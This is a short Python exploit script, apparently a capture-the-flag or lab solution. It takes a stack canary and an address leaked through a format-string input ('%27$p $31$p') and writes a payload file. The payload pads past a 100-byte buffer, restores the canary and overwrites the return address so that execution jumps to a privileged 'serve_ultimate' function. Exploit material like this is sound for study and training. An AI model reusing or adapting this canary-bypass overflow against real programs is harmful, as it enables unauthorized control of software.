from sys import argv
import struct

# input %27$p $31$p
canary = struct.pack('<L', int(argv[1], base=16))
ret_addr = struct.pack('<L', int(argv[2], base=16) + int("0x145", base=16))
# chech_auth + 0x145 = serve_ultimate

with open("out", "wb") as bfile:
  tmp = "a" * 100 #total 100 chars
  bfile.write(str.encode(tmp))
  bfile.write(canary) #write canary
  tmp = "a" * 12 # go to return address
  bfile.write(str.encode(tmp))
  bfile.write(ret_addr) # overide with serve_ultimate
